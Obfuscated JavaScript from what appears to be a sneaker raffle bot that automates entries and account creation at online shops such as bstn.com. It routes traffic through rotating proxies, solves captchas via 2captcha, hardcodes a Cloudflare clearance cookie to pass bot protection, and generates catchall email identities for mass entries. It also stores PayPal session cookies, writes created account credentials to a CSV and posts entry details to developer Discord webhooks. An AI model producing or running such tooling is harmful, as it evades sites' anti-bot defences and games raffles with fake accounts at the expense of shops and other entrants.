        _0x4204b1(_0x32b842['name'] + '\x20Task\x20' + (_0x259d3a + 0x1) + '\x20/\x20' + _0x581052['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446), await _0x3e9f80(_0x581052, _0x259d3a), _0x4fec48 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x4ca7a9
                },
                {
                    'name': 'Size',
                    'value': '' + _0x581052[_0x259d3a]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x4c3205['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x4351c2
                }
            ]
        }], _0x49be6f = { 'embeds': _0x4fec48 }, _0x2ffdf6 = _0x32b842['data'];
        _0x54a67c == 'exp' ? _0x2ffdf6['data']['attributes']['email'] = '' + _0x581052[_0x259d3a]['FirstName'] + _0x581052[_0x259d3a]['LastName'] + _0x4c3205['catchall'] : _0x2ffdf6['data']['attributes']['email'] = '' + _0x581052[_0x259d3a]['Email'];
        if (_0x581052[_0x259d3a]['Size'] == 'RANDOM') {
        }
        _0x2ffdf6['data']['attributes']['properties']['$first_name'] = '' + _0x581052[_0x259d3a]['FirstName'], _0x2ffdf6['data']['attributes']['properties']['$last_name'] = '' + _0x581052[_0x259d3a]['LastName'], _0x2ffdf6['data']['attributes']['properties']['$address1'] = _0x581052[_0x259d3a]['Address1'] + '\x20' + _0x581052[_0x259d3a]['Address2'] + '\x20' + _0x581052[_0x259d3a]['HouseNumber'], _0x2ffdf6['data']['attributes']['properties']['$zip'] = '' + _0x581052[_0x259d3a]['Zip'], _0x2ffdf6['data']['attributes']['properties']['$city'] = '' + _0x581052[_0x259d3a]['City'], _0x2ffdf6['data']['attributes']['properties']['$country'] = '' + _0x581052[_0x259d3a]['Country'], _0x2ffdf6['data']['attributes']['properties']['Size'] = '' + _0x581052[_0x259d3a]['Size'], _0x2ffdf6['data']['attributes']['properties']['$phone_number'] = '' + _0x581052[_0x259d3a]['Phone'], _0x2ffdf6['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x581052[_0x259d3a]['Follower'];
    }
    if (_0x4c3205['useRandomProxy'] = ![])
        var _0x29a2bd = _0x423490[_0x259d3a]['split'](':');
    else
        var _0x407b2a = Math['round'](Math['random']() * (_0x423490['length'] - 0x1)), _0x29a2bd = _0x423490[_0x407b2a]['split'](':');
    var _0x48abb3 = {
        'jar': _0x45c692,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x32b842['url'],
        'headers': _0x32b842['headers'],
        'body': JSON['stringify'](_0x2ffdf6),
        'proxy': 'http://' + _0x29a2bd[0x2] + ':' + _0x29a2bd[0x3] + '@' + _0x29a2bd[0x0] + ':' + _0x29a2bd[0x1]
    };
    return _0x54a67c != 'ver' && (_0x48abb3['url'] = _0x32b842['url'], _0x48abb3['headers'] = _0x32b842['headers']), _0x54a67c == 'ver' && (_0x48abb3['method'] = 'GET'), new Promise(function (_0x1bd983, _0x5e1494) {
        callback = async (_0x46afc8, _0x34fcde, _0x2bde64) => {
            if (!_0x46afc8 && _0x34fcde['statusCode'] == 0xca || !_0x46afc8 && _0x34fcde['statusCode'] == 0xc8) {
                if (_0x54a67c != 'ver') {
                    var _0x5e59ce = await _0x5b798c(_0x581052[_0x259d3a], _0x32b842, 'dev', ![]), _0x127632 = await _0x5b798c(_0x581052[_0x259d3a], _0x32b842, 'pub', ![]);
                    const _0x3898ce = {
                        'succesDEVMSG': { 'embeds': [_0x5e59ce] },
                        'succesPUBMSG': { 'embeds': [_0x127632] }
                    };
                    if (_0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '')
                        try {
                            await _0x331f59(_0x4c3205['webhook'], _0x3898ce['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4e5841(0xc8), await _0x331f59(_0x45c891, _0x3898ce['succesDEVMSG']), await _0x4e5841(0xc8);
                    try {
                        await _0x331f59(_0x5ca215, _0x3898ce['succesPUBMSG']);
                    } catch {
                    }
                    _0x4fb703(_0x581052[_0x259d3a], _0x32b842);
                }
                _0x1bd983(console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x32b842['name'] + ']\x20Task\x20' + (_0x259d3a + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x54a67c != 'ver') {
                    var _0x22e838 = '' + _0x46afc8, _0x294117 = await _0x5b798c(_0x581052[_0x259d3a], _0x32b842, 'dev', !![], _0x22e838), _0x392518 = {};
                    _0x392518['errorDEV'] = { 'embeds': [_0x294117] }, _0x20b8ba(_0x581052[_0x259d3a], _0x32b842), _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x392518['errorDEV']), await _0x331f59(_0x40d0b0, _0x392518['errorDEV']);
                }
                _0x5e1494(console['log'](_0x21f008() + '\x20[' + _0x32b842['name'] + ']\x20Task\x20' + (_0x259d3a + 0x1) + ':\x20' + _0x46afc8));
            }
        };
        try {
            _0x54a67c != 'ver' && console['log'](_0x21f008() + '\x20[' + _0x32b842['name'] + ']\x20Task\x20' + (_0x259d3a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2ffdf6['data']['attributes']['email']), _0x306f3e(_0x48abb3, callback);
        } catch (_0x107f7b) {
            console['log'](_0x21f008() + '\x20Task\x20' + (_0x259d3a + 0x1) + ':\x20' + _0x107f7b);
        }
    });
}
;
async function _0x5260bd(_0x310110, _0x19f484, _0xdc769b) {
    var _0x5003fb;
    _0x4204b1('' + _0x19f484);
    var _0x221446 = _0xdc769b[0x0]['split'](':');
    const _0x3ca433 = await _0x4ec495['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x221446[0x0] + ':' + _0x221446[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x21f008() + '\x20[' + _0x19f484 + ']\x20Getting\x20Session');
        const _0x43d0ca = JSON['parse'](_0x3fdbd7['readFileSync']('sessions/log.json')), _0x319376 = await _0x3ca433['newPage']();
        await _0x319376['authenticate']({
            'username': '' + _0x221446[0x2],
            'password': '' + _0x221446[0x3]
        }), await _0x319376['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x319376, await _0x319376['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x21f008() + '\x20[' + _0x19f484 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x319376['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x21f008() + '\x20[' + _0x19f484 + ']\x20Successfully\x20logged\x20in'), await _0x4e5841(0x2710), _0x5003fb = await _0x319376['cookies'](), _0x3fdbd7['writeFileSync']('sessions/log.json', '' + JSON['stringify'](_0x5003fb));
        } catch (_0x35f3e4) {
            throw new Error('Login\x20session\x20expired\x20' + _0x35f3e4);
        }
        for (var _0x205b0f = 0x0; _0x205b0f < _0x310110['length']; _0x205b0f++) {
            console['log'](_0x21f008() + '\x20[' + _0x19f484 + ']\x20Task\x20' + (_0x205b0f + 0x1) + '\x20:\x20Starting\x20Verification'), _0x4204b1(_0x19f484 + '\x20Task\x20' + (_0x205b0f + 0x1) + '\x20/\x20' + _0x310110['length']);
            const _0x47c170 = await _0x3ca433['newPage']();
            await _0x47c170['goto']('' + _0x310110[_0x205b0f], { 'waitUntil': 'networkidle2' }), await _0x4e5841(0xbb8);
            try {
                const _0x5b018a = await _0x47c170['$']('#challenge-heading');
                _0x5b018a && (console['log'](_0x21f008() + '\x20[' + _0x19f484 + ']\x20Task\x20' + (_0x205b0f + 0x1) + '\x20:\x20' + _0x108b38['yellow']('2FA\x20Required')), await _0x47c170['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x4e5841(0x61a8), await _0x47c170['waitForSelector']('#payment-submit-btn'), await _0x47c170['$eval']('#payment-submit-btn', _0x45eaec => _0x45eaec['click']()), await _0x47c170['click']('#payment-submit-btn');
                try {
                    await _0x47c170['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x4e5841(0x5dc), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x19f484 + ']\x20Task\x20' + (_0x205b0f + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x498e1b) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x498e1b['message']);
                } finally {
                    await _0x47c170['close'](), await _0x4e5841(0x4650);
                }
            } catch (_0x45e86f) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x19f484 + ']\x20Task\x20' + (_0x205b0f + 0x1) + '\x20:\x20' + _0x45e86f));
            }
        }
    } catch (_0x4ff268) {
        console['log'](_0x108b38['red']('' + _0x4ff268));
    } finally {
        await _0x3ca433['close']();
    }
}
async function _0xc0fd4(_0x37ce72, _0xcdd188, _0x1e30c1) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3e1b9f = 0x0; _0x3e1b9f < _0x37ce72['length']; _0x3e1b9f++) {
        if (_0x2ab7cc != 'yes')
            var _0x2ab7cc = '', _0x168e13 = 0x0;
        var _0x3faaa6;
        await _0x3e9f80(_0x37ce72, _0x3e1b9f), _0x4204b1(_0x1e30c1['name'] + '\x20Task\x20' + (_0x3e1b9f + 0x1) + '\x20/\x20' + _0x37ce72['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446);
        var _0x11843b = await _0x5b798c(_0x37ce72[_0x3e1b9f], _0x1e30c1, 'acc', ![]);
        const _0x181a1b = { 'succesDEVMSG': { 'embeds': [_0x11843b] } }, _0x391b66 = 'https://www.bstn.com/eu_en/customer/account/create/';
        var _0x496700 = Math['round'](Math['random']() * (_0xcdd188['length'] - 0x1)), _0x301416 = _0xcdd188[_0x496700]['split'](':');
        const _0x29f7ed = await _0x4ec495['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x301416[0x0] + ':' + _0x301416[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x56440a = await _0x29f7ed['newPage']();
            await _0x56440a['authenticate']({
                'username': '' + _0x301416[0x2],
                'password': '' + _0x301416[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x1e30c1['name'] + ']\x20Task\x20' + (_0x3e1b9f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x56440a['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x56440a['setRequestInterception'](!![]), _0x56440a['on']('request', _0x455678 => {
                _0x455678['resourceType']() === 'image' ? _0x455678['abort']() : _0x455678['continue']();
            }), await _0x56440a['goto']('' + _0x391b66), await _0x56440a['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x56440a['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x21f008() + '\x20[' + _0x1e30c1['name'] + ']\x20Task\x20' + (_0x3e1b9f + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4e5841(0x7d0), console['log'](_0x21f008() + '\x20[' + _0x1e30c1['name'] + ']\x20Task\x20' + (_0x3e1b9f + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4e5841(0x190), await _0x56440a['waitForSelector']('#firstname'), await _0x56440a['type']('#firstname', _0x37ce72[_0x3e1b9f]['FirstName'], { 'delay': 0xf0 }), await _0x4e5841(0x190), await _0x56440a['type']('#lastname', _0x37ce72[_0x3e1b9f]['LastName'], { 'delay': 0xe6 }), await _0x4e5841(0x190), await _0x56440a['type']('#email_address', _0x37ce72[_0x3e1b9f]['Email'], { 'delay': 0x122 }), await _0x4e5841(0x190), await _0x56440a['type']('#password', _0x37ce72[_0x3e1b9f]['Password'], { 'delay': 0x82 }), await _0x4e5841(0x1f4), await _0x56440a['type']('#password-confirmation', _0x37ce72[_0x3e1b9f]['Password'], { 'delay': 0x7c }), console['log'](_0x21f008() + '\x20[' + _0x1e30c1['name'] + ']\x20Task\x20' + (_0x3e1b9f + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4e5841(0x2bc), await _0x56440a['$eval']('#form-validate', _0x4c06a4 => _0x4c06a4['submit']()), await _0x4e5841(0x1388);
            const _0x1e9b5c = await _0x56440a['$']('#email_address-error');
            if (_0x1e9b5c)
                throw new Error('Invalid\x20Email');
            const _0x3797a9 = await _0x56440a['$']('#password-error');
            if (_0x3797a9)
                throw new Error('Invalid\x20Password');
            await _0x56440a['waitForSelector']('div.mesg-success'), _0x2ab7cc = 'no', console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x1e30c1['name'] + ']\x20Task\x20' + (_0x3e1b9f + 0x1) + '\x20:\x20Account\x20' + _0x37ce72[_0x3e1b9f]['Email'] + '\x20Generated')), _0x3fdbd7['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x37ce72[_0x3e1b9f]['Email'] + ',' + _0x37ce72[_0x3e1b9f]['Password']);
            try {
                _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x181a1b['succesDEVMSG']);
            } catch {
            }
            await _0x331f59(_0x2055ba, _0x181a1b['succesDEVMSG']), console['log'](_0x108b38['yellow'](_0x21f008() + '\x20[' + _0x1e30c1['name'] + ']\x20Task\x20' + (_0x3e1b9f + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0xccdd2f) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x1e30c1['name'] + ']\x20Task\x20' + (_0x3e1b9f + 0x1) + '\x20:\x20' + _0xccdd2f)), _0x3faaa6 = '' + _0xccdd2f;
            var _0x3fc076 = await _0x5b798c(_0x37ce72[_0x3e1b9f], _0x1e30c1, 'acc', !![], _0x3faaa6);
            _0x181a1b['errorDEV'] = { 'embeds': [_0x3fc076] }, _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x181a1b['errorDEV']), await _0x331f59(_0x40d0b0, _0x181a1b['errorDEV']), _0x2ab7cc = 'yes';
        } finally {
            _0x29f7ed['close']();
            if (_0x2ab7cc == 'yes' && _0x168e13 != 0x5) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x1e30c1['name'] + ']\x20Task\x20' + (_0x3e1b9f + 0x1) + '\x20:\x20Retrying')), _0x3e1b9f = _0x3e1b9f - 0x1, _0x168e13 = _0x168e13 + 0x1;
                continue;
            }
            _0x2ab7cc == 'yes' && _0x168e13 >= 0x5 && (_0x20b8ba(_0x37ce72[_0x3e1b9f], _0x1e30c1), _0x2ab7cc = 'no', _0x168e13 = 0x0), console['log'](_0x21f008() + '\x20[' + _0x1e30c1['name'] + ']\x20Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x58ea1b(_0x3e49a8, _0x239e59, _0x3b2d52) {
    _0x4ec495['use'](_0x21618b());
    for (var _0x29965a = 0x0; _0x29965a < _0x3e49a8['length']; _0x29965a++) {
        if (_0x3a255d != 'yes')
            var _0x3a255d = '', _0x1457c3 = 0x0;
        var _0x1e9852 = Math['round'](Math['random']() * (_0x239e59['length'] - 0x1)), _0x2f1c92 = _0x239e59[_0x1e9852]['split'](':');
        const _0x2d74e4 = await _0x4ec495['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x2f1c92[0x0] + ':' + _0x2f1c92[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1a62b1 = await _0x2d74e4['newPage']();
            await _0x1a62b1['authenticate']({
                'username': '' + _0x2f1c92[0x2],
                'password': '' + _0x2f1c92[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x3b2d52['name'] + ']\x20Task\x20' + (_0x29965a + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x1a62b1['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1a62b1['setRequestInterception'](!![]), _0x1a62b1['on']('request', _0x465706 => {
                _0x465706['resourceType']() === 'image' || _0x465706['resourceType']() === 'font' || _0x465706['resourceType']() === 'media' ? _0x465706['abort']() : _0x465706['continue']();
            }), console['log'](_0x21f008() + '\x20[' + _0x3b2d52['name'] + ']\x20Task\x20' + (_0x29965a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1a62b1['goto'](_0x3e49a8[_0x29965a]), console['log'](_0x21f008() + '\x20[' + _0x3b2d52['name'] + ']\x20Task\x20' + (_0x29965a + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1a62b1['waitForTimeout'](0xbb8);
            try {
                await _0x1a62b1['waitForSelector']('.dashboard-main_title'), _0x3a255d = 'no', console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x3b2d52['name'] + ']\x20Task\x20' + (_0x29965a + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x1b6d2b = await _0x5b798c(null, _0x3b2d52, 'ver', ![]);
                const _0x5eab9b = { 'succesDEVMSG': { 'embeds': [_0x1b6d2b] } };
                await _0x331f59(_0x2d16bc, _0x5eab9b['succesDEVMSG']);
            } catch (_0x23c901) {
                throw new Error(_0x23c901);
            }
        } catch (_0x49e8e0) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3b2d52['name'] + ']\x20Task\x20' + (_0x29965a + 0x1) + '\x20:\x20' + _0x49e8e0));
            var _0x13a6b4 = _0x49e8e0, _0x44893f = await _0x5b798c(null, _0x3b2d52, 'ver', !![], _0x13a6b4);
            const _0x165655 = { 'errorDEVMSG': { 'embeds': [_0x44893f] } };
            _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x165655['errorDEVMSG']), await _0x331f59(_0x40d0b0, _0x165655['errorDEVMSG']), _0x3a255d = 'yes';
        } finally {
            _0x2d74e4['close']();
            if (_0x3a255d == 'yes' && _0x1457c3 != 0x5) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3b2d52['name'] + ']\x20Task\x20' + (_0x29965a + 0x1) + '\x20:\x20Retrying')), _0x29965a = _0x29965a - 0x1, _0x1457c3 = _0x1457c3 + 0x1;
                continue;
            }
            _0x3a255d == 'yes' && _0x1457c3 >= 0x5 && (_0x20b8ba(bstn[_0x29965a], _0x3b2d52), _0x3a255d = 'no', _0x1457c3 = 0x0), console['log'](_0x21f008() + '\x20[' + _0x3b2d52['name'] + ']\x20Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x159c25(_0x70a84a, _0x8ac6a1, _0x1d5fb9) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x6030c2 = 0x0; _0x6030c2 < _0x70a84a['length']; _0x6030c2++) {
        var _0x3b4865;
        await _0x3e9f80(_0x70a84a, _0x6030c2);
        if (_0x21dc3f != 'yes')
            var _0x21dc3f = '', _0x113f88 = 0x0;
        _0x4204b1(_0x1d5fb9['name'] + '\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20/\x20' + _0x70a84a['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446);
        var _0x4abdd1 = Math['round'](Math['random']() * (_0x8ac6a1['length'] - 0x1)), _0x3eabab = _0x8ac6a1[_0x4abdd1]['split'](':'), _0x17f730;
        try {
            _0x17f730 = await _0x4ec495['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x3eabab[0x0] + ':' + _0x3eabab[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x17f730 = await _0x4ec495['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x3eabab[0x0] + ':' + _0x3eabab[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x58178e = await _0x17f730['newPage'](), _0x1605f0 = await _0x58178e['target']()['createCDPSession'](), { windowId: _0x5e68eb } = await _0x1605f0['send']('Browser.getWindowForTarget');
            await _0x58178e['setViewport']({
                'width': 0x501,
                'height': 0x2d0
            });
            var _0x41c35f = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x58178e['authenticate']({
                'username': '' + _0x3eabab[0x2],
                'password': '' + _0x3eabab[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x58178e['goto']('' + _0x70a84a[_0x6030c2]['Url']), console['log'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x58178e['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x1605f0['send']('Browser.setWindowBounds', {
                'windowId': _0x5e68eb,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x4e5841(0x1388), await _0x58178e['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x58178e['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4e5841(0x1f4), console['log'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20Logging\x20in'), await _0x58178e['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x3be5cb => _0x3be5cb['click']()), await _0x58178e['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x58178e['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4e5841(0x7d0), await _0x58178e['waitForSelector']('#email-login'), await _0x58178e['type']('#email-login', '' + _0x70a84a[_0x6030c2]['Email']), await _0x4e5841(0x1f4), await _0x58178e['waitForSelector']('#password'), await _0x58178e['type']('#password', '' + _0x70a84a[_0x6030c2]['Password']), await _0x4e5841(0x1f4);
            try {
                await _0x58178e['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x34a95b => _0x34a95b['click']()), await _0x58178e['click']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]');
            } catch {
            }
            try {
                await _0x58178e['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0x52a4a2) {
            }
            await _0x4e5841(0x3e8);
            const _0xd94228 = await _0x58178e['$']('.enteredDraw_container__2KmQ_');
            if (_0xd94228)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x70a84a[_0x6030c2]['Size']);
            if (_0x70a84a[_0x6030c2]['Size'] != 'RANDOM') {
                var _0x2043e4 = _0x70a84a[_0x6030c2]['Size']['replace']('.', ',');
                const _0x2505c1 = await _0x58178e['$x']('//div[contains(text(),\x20' + _0x2043e4 + ')]');
                await _0x2505c1[0x0]['click']();
            } else {
                const _0x67e1b1 = await _0x58178e['$$']('div.swatchTile_tile__IRH9Q');
                var _0x3f096a = Math['round'](Math['random']() * (_0x67e1b1['length'] - 0x1));
                await _0x67e1b1[_0x3f096a]['click']();
            }
            await _0x4e5841(0x1f4);
            const _0x227e27 = await _0x58178e['$']('.addressList_addressItem__LE2PB');
            if (_0x227e27 && _0x70a84a[_0x6030c2]['Mode'] != 'NEW') {
            } else
                console['log'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x58178e['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x4e5841(0x5dc), await _0x58178e['waitForSelector']('#firstname'), await _0x58178e['type']('#firstname', '' + _0x70a84a[_0x6030c2]['FirstName']), await _0x4e5841(0x1f4), await _0x58178e['waitForSelector']('#firstname'), await _0x58178e['type']('#lastname', '' + _0x70a84a[_0x6030c2]['LastName']), await _0x4e5841(0x1f4), await _0x58178e['waitForSelector']('#firstname'), await _0x58178e['type']('#street', '' + _0x70a84a[_0x6030c2]['Address1']), await _0x4e5841(0x1f4), await _0x58178e['waitForSelector']('#firstname'), await _0x58178e['type']('#houseNumber', _0x70a84a[_0x6030c2]['HouseNumber'] + '\x20' + _0x70a84a[_0x6030c2]['Address2']), await _0x4e5841(0x1f4), await _0x58178e['waitForSelector']('#firstname'), await _0x58178e['select']('#country_code', '' + _0x70a84a[_0x6030c2]['Country']), await _0x4e5841(0x1f4), await _0x58178e['type']('#postcode', '' + _0x70a84a[_0x6030c2]['Zip']), await _0x4e5841(0x1f4), await _0x58178e['type']('#city', '' + _0x70a84a[_0x6030c2]['City']), await _0x4e5841(0x1f4), await _0x58178e['type']('#telephone', '' + _0x70a84a[_0x6030c2]['Phone']), await _0x4e5841(0x1f4), await _0x58178e['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x4e5841(0x9c4);
            try {
                await _0x58178e['type']('#instagram_name', '' + _0x70a84a[_0x6030c2]['Follower']), await _0x58178e['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            console['log'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4e5841(0x5dc);
            try {
                await _0x58178e['click']('.checkBox_boxHolder__wLGVe');
            } catch {
            }
            await _0x4e5841(0x5dc), await _0x58178e['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x2de6b9 => _0x2de6b9['click']()), await _0x4e5841(0x1388);
            try {
                await _0x58178e['waitForSelector']('.success_msg__2HjJY');
            } catch {
                await _0x58178e['reload']({ 'waitUntil': 'networkidle2' });
                if (_0x70a84a[_0x6030c2]['Size'] != 'RANDOM') {
                    var _0x2043e4 = _0x70a84a[_0x6030c2]['Size']['replace']('.', ',');
                    const _0x2337aa = await _0x58178e['$x']('//div[contains(text(),\x20' + _0x2043e4 + ')]');
                    await _0x2337aa[0x0]['click']();
                } else {
                    const _0x23d624 = await _0x58178e['$$']('div.swatchTile_tile__IRH9Q');
                    var _0x3f096a = Math['round'](Math['random']() * (_0x23d624['length'] - 0x1));
                    await _0x23d624[_0x3f096a]['click']();
                }
                await _0x4e5841(0x5dc);
                try {
                    await _0x58178e['hover']('#instagram_name'), await _0x58178e['type']('#instagram_name', '' + _0x70a84a[_0x6030c2]['Follower']), await _0x58178e['click']('.note_groupBtn__WLDwH\x20>\x20button');
                } catch {
                }
                console['log'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20Retrying'), await _0x58178e['hover']('.checkBox_boxHolder__wLGVe'), await _0x4e5841(0x5dc), await _0x58178e['click']('.checkBox_boxHolder__wLGVe'), await _0x4e5841(0x157c), await _0x58178e['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3221e3 => _0x3221e3['click']()), await _0x4e5841(0x1388), await _0x58178e['waitForSelector']('.success_msg__2HjJY');
            }
            _0x21dc3f = 'no', _0x4fb703(_0x70a84a[_0x6030c2], _0x1d5fb9), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x31cc17 = await _0x5b798c(_0x70a84a[_0x6030c2], _0x1d5fb9, 'dev', ![]), _0x5cbd43 = await _0x5b798c(_0x70a84a[_0x6030c2], _0x1d5fb9, 'pub', ![]);
            const _0x5a1a70 = {
                'succesDEVMSG': { 'embeds': [_0x31cc17] },
                'succesPUBMSG': { 'embeds': [_0x5cbd43] }
            };
            try {
